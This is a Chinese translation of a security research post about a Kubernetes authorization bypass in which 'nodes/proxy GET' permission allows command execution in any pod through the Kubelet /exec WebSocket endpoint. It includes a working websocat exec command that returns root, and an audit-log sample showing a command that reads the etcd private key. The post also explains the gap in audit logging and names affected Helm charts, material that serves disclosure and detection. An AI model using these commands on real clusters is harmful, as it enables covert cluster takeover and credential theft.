---
title: Kubernetes 通过 nodes/proxy GET 权限在集群任意 Pod 中执行命令（RCE）
url: https://mp.weixin.qq.com/s/dplQXBA3vxFmMm1c8qjc7A
source: Doonsec's feed
date: 2026-01-31
fetch_date: 2026-02-01T04:23:08.123365
---

# Kubernetes 通过 nodes/proxy GET 权限在集群任意 Pod 中执行命令（RCE）

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/hoiaQy7WhTCPfW0EB7O0QSynJ8wXGtoYEwGu3UPCFxjFj57icpWVJBxatkH4qh6vyfiaWloCkhtQiaxtbY9laFg70g/0?wx_fmt=jpeg)

# Kubernetes 通过 nodes/proxy GET 权限在集群任意 Pod 中执行命令（RCE）

grahamhelton
grahamhelton

securitainment

![]()

在小说阅读器中沉浸阅读

> Kubernetes RBAC 中的一个授权绕过允许仅拥有 `nodes/proxy GET`权限的主体在集群内任意 Pod 中执行命令。

| 原文链接 | 作者 |
| --- | --- |
| <https://grahamhelton.com/blog/nodes-proxy-rce> | grahamhelton |

# 简介

在本文中，我将介绍当服务账户具有 `nodes/proxy GET`权限时，如何在许多 Kubernetes 集群中的每个 Pod 中执行代码。这个问题最初通过 Kubernetes 安全披露流程报告，但被认定为设计目的而关闭。

![Executing Commands In Another Pod](https://mmbiz.qpic.cn/mmbiz_gif/hoiaQy7WhTCPfW0EB7O0QSynJ8wXGtoYEP9frgGxOROyne23opiazy7bhOVCSJLlb4utcsnTFfQ9ESmRCB69GI7Q/640?wx_fmt=gif&from=appmsg)

Executing Commands In Another Pod

*在另一个 Pod 中执行命令*

| 属性 | 详情 |
| --- | --- |
| **易受攻击的权限** | `nodes/proxy GET` |
| **测试的 Kubernetes 版本** | v1.34, v1.35 |
| **所需的网络访问** | Kubelet API（端口 10250） |
| **影响** | 在可达节点的任何 Pod 中执行代码 |
| **披露状态** | 不修复（设计目的） |
| **受影响的 Helm 图表** | 69 |

Kubernetes 管理员通常向需要访问 Pod 指标和容器日志等数据的服务账户授予 `nodes/proxy`资源的访问权限。因此，Kubernetes 监控工具通常需要此资源来读取数据。

`nodes/proxy GET`允许在使用 WebSocket 等连接协议时执行命令。这是因为 Kubelet 仅基于初始 WebSocket 握手的请求进行授权决策，**而不**验证 Kubelet 的 `/exec`端点是否存在 `CREATE`权限，这些端点要求的权限完全取决于连接协议。

结果是任何具有对 `nodes/proxy GET`的服务账户访问权限且能够在端口 10250 连接到节点的 Kubelet 的人都可以向 `/exec`端点发送信息，**在任何 Pod 中执行命令，包括特权系统 Pod**，可能导致完整的集群入侵。**Kubernetes AuditPolicy 不记录通过直接连接到 Kubelet API 执行的命令。**

**这不是特定供应商的问题。**供应商广泛使用 `nodes/proxy GET`权限，因为没有通常可用的可行替代方案。快速搜索返回了 69 个提及 `nodes/proxy GET`权限的 helm 图表。一些图表默认包含它，而其他图表可能需要额外的选项配置。如果您有疑虑，请向供应商咨询并查看本文的检测部分。

**注意**：一些图表要求启用相关功能才能使用 `nodes/proxy`。例如，cilium 必须配置为使用 Spire。

以下是一些值得注意的图表。有关已识别的 69 个 Helm 图表的完整列表，请参阅本文的附录：

* prometheus-community/prometheus
* grafana/promtail
* datadog/datadog
* elastic/elastic-agent
* cilium/cilium
* opentelemetry-helm/opentelemetry-kube-stack
* trivy-operator/trivy-operator
* newrelic/newrelic-infrastructure
* wiz-sec/sensor

以下 ClusterRole 显示了利用此漏洞所需的所有权限。

```
# Vulnerable ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: nodes-proxy-reader
rules:
  - apiGroups: [""]
resources: ["nodes/proxy"]
verbs: ["get"]
```

作为集群管理员，您可以使用此检测脚本检查集群中所有服务账户的此权限。

如果服务账户易受攻击，可以使用 websocat 等工具在集群中的所有 Pod 中运行命令：

```
websocat --insecure \
  --header "Authorization: Bearer $TOKEN"\
  --protocol v4.channel.k8s.io \
"wss://$NODE_IP:10250/exec/default/nginx/nginx?output=1&error=1&command=id"

uid=0(root) gid=0(root) groups=0(root)
```

如果您想自己动手，我已经发布了一个实验室，用于演练如何在其他 Pod 中执行命令：https://labs.iximiuz.com/tutorials/nodes-proxy-rce-c9e436a9

![演示环境](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPfW0EB7O0QSynJ8wXGtoYEdJV8Sa3rutsJL8wotnPo4sNFfjseCAm4R48HKv06AxKkb2C1fMWopA/640?wx_fmt=png&from=appmsg)

演示环境

*演示环境*

如果您想获得早期研究通知，可以使用 RSS 订阅或直接发送到您的收件箱。

---

# 深入探讨：什么是 Nodes/Proxy?

快速回顾：Kubernetes RBAC 使用资源和动词来控制访问。资源如 `pods`、`pods/exec`或`pods/logs`映射到特定操作，动词如`get`、`create`或`delete`定义允许的操作。例如，具有`create`动词的`pods/exec`允许在 Pod 中执行命令，而具有`get`动词的`pods/logs`允许读取日志。

`nodes/proxy`资源很特殊。与大多数 Kubernetes 资源不同（如 `pods/exec`用于命令执行或 `pods/logs`用于日志访问），`nodes/proxy`是一个全能权限，控制对 Kubelet API 的访问。它通过授予对两个不同但略有关联的端点（称为 **API 服务器代理**和 **Kubelet API**）的访问权限来实现这一点。

## API 服务器代理

`nodes/proxy`授予访问的第一个端点是 API 服务器代理端点 `$API_SERVER/api/v1/nodes/$NODE_NAME/proxy/...`。

发送到此端点的请求从 API 服务器代理到目标节点的 Kubelet。这用于许多操作，但一些常见的操作包括：

* 读取指标：`$API_SERVER/api/v1/nodes/$NODE_NAME/proxy/metrics`
* 读取资源使用情况：`$API_SERVER/api/v1/nodes/$NODE_NAME/proxy/stats/summary`
* 获取容器日志：`$API_SERVER/api/v1/nodes/$NODE_NAME/proxy/containerLogs/$NAMESPACE/$POD_NAME/$CONTAINER_NAME`

可以使用 kubectl 的 `--raw`标志或直接使用 curl 访问这些。例如，向指标端点发送请求会返回一些基本指标信息：

```
# with kubectl
kubectl get --raw /api/v1/nodes/$NODE_NAME/proxy/metrics | head -n 10

# Or with curl
curl -sk -H "Authorization: Bearer $TOKEN"$API_SERVER/api/v1/nodes/$NODE_NAME/proxy/metrics | head -n 10
```

```
# HELP aggregator_discovery_aggregation_count_total [ALPHA] Counter of number of times discovery was aggregated
# TYPE aggregator_discovery_aggregation_count_total counter
aggregator_discovery_aggregation_count_total 0
# HELP apiserver_audit_event_total [ALPHA] Counter of audit events generated and sent to the audit backend.
# TYPE apiserver_audit_event_total counter
apiserver_audit_event_total 0
# HELP apiserver_audit_requests_rejected_total [ALPHA] Counter of apiserver requests rejected due to an error in audit logging backend.
# TYPE apiserver_audit_requests_rejected_total counter
apiserver_audit_requests_rejected_total 0
# HELP apiserver_client_certificate_expiration_seconds [ALPHA] Distribution of the remaining lifetime on the certificate used to authenticate a request.
```

由于该请求会经过 API Server，因此（如果配置了 AuditPolicy）会为 `pods/exec`和 `subjectaccessreviews`资源生成审计日志。在记录的 `pods/exec`请求中，注意 `requestURI`字段会显示在 Pod 中执行的完整命令。

```
// Request generated via AuditPolicy
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "Metadata",
  "auditID": "196f4d69-6cfa-4812-b7b9-4bf13689cb8d",
  "stage": "RequestReceived",
  "requestURI": "/api/v1/namespaces/kube-system/pods/etcd-minikube/exec?command=sh&command=-c&command=filename%3D%2Fvar%2Flib%2Fminikube%2Fcerts%2Fetcd%2Fserver.key%3B+while+IFS%3D+read+-r+line%3B+do+printf+%22%25s%5C%5Cn%22+%22%24line%22%3Bdone+%3C+%22%24filename%22&container=etcd&stdin=true&stdout=true&tty=true",
  "verb": "get",
  "user": {
    "username": "minikube-user",
    "groups": [
      "system:masters",
      "system:authenticated"
    ],
    "extra": {
      "authentication.kubernetes.io/credential-id": [
        "X509SHA256=3da792d1a94c5205821984a672707270a9f2d8e27190eb09051b15448e5bf0c3"
      ]
    }
  },
  "sourceIPs": [
    "192.168.67.1"
  ],
  "userAgent": "kubectl/v1.31.0 (linux/amd64) kubernetes/9edcffc",
  "objectRef": {
    "resource": "pods",
    "namespace": "kube-system",
    "name": "etcd-minikube",
    "apiVersion": "v1",
    "subresource": "exec"
  },
  "requestReceivedTimestamp": "2025-11-04T05:42:51.025534Z",
  "stageTimestamp": "2025-11-04T05:42:51.025534Z"
}
```

## Kubelet API

除了 API 服务器代理端点外，`nodes/proxy`资源还授予对 Kubelet API 的直接访问。请记住，每个节点都有一个 Kubelet 进程负责告诉容器运行时要创建哪些容器。

Kubelet 公开了各种 API 端点，提供与 API 服务器代理类似的信息。例如，我们可以通过直接查询 Kubelet API 返回与之前相同的指标数据。

```
curl -sk -H "Authorization: Bearer $TOKEN" https://$NODE_IP:10250/metrics | head -n 10
```

**注意**：这里必须使用节点的 IP，而不是像通过 API Server 发起请求时那样使用节点名。

```
# HELP aggregator_discovery_aggregation_count_total [ALPHA] Counter of number of times discovery was aggregated
# TYPE aggregator_discovery_aggregation_count_total counter
aggregator_discovery_aggregation_count_total 0
# HELP apiserver_audit_event_total [ALPHA] Counter of audit events generated and sent to the audit backend.
# TYPE apiserver_audit_event_total counter
apiserver_audit_event_total 0
# HELP apiserver_audit_requests_rejected_total [ALPHA] Counter of apiserver requests rejected due to an error in audit logging backend.
# TYPE apiserver_audit_requests_rejected_total counter
apiserver_audit_requests_rejected_total 0
# HELP apiserver_client_certificate_expiration_seconds [ALPHA] Distribution of the remaining lifetime on the certificate used to authenticate a request.
```

有趣的是，这种与 Kubelet 的直接连接不经过 API 服务器，这意味着 Kubernetes AuditPolicy 仅生成检查执行操作授权的 `subjectaccessreviews`日志，但**不**记录 `pods/exec`操作，防止我们看到在 Pod 中执行的完整命令。

```
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "Metadata",
  "auditID": "1be86af9-26e7-40e9-aaae-bbb904df129b",
  "stage": "ResponseComplete",
  "requestURI": "/apis/authorization.k8s.io/v1/subjectaccessreviews",
  "verb": "create",
  "user": {
    "username": "system:node:minikube",
    "groups": [
      "system:nodes",
      "system:authenticated"
    ],
    "extra": {
      "authentication.kubernetes.io/credential-id": [
        "X509SHA256=52d652baad2bfd4d1fa0bb82308980964f8c7fbf01784f30e096accd1691f889"
      ]
    }
  },
  "sourceIPs": [
    "192.168.67.2"
  ],
  "userAgent": "kubelet/v1.34.0 (linux/amd64) kubernetes/f28b4c9",
  "...